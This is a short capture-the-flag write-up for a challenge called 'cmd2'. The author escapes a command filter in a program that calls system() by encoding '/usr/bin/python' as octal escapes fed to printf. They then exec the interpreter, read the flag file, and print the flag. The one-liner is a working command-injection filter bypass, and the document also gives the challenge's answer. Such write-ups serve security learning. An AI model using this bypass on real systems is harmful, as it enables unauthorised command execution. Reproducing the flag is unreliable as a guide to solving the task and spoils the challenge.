# Description
```
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!
```
---
Very similar level to the last one, this time they remove our environment variables.
I thought of a few solutions - this is the simplest one - char escaping:
```shell
./cmd2 'exec "$(printf '\''\057usr\057bin\057python'\'')"'
```
We're passing the following to `system()`:
```shell
exec "$(printf '\''\057usr\057bin\057python'\'')"
```
Where the `printf` translates to:
```
/usr/bin/python
```
And there we can run the same exploit from last time - 
```python
>>> from pathlib import Path
>>> Path("/home/cmd2/flag").read_text()
'Shell_variables_can_be_quite_fun_to_play_with!\n'
```

# Flag
```
Shell_variables_can_be_quite_fun_to_play_with!
```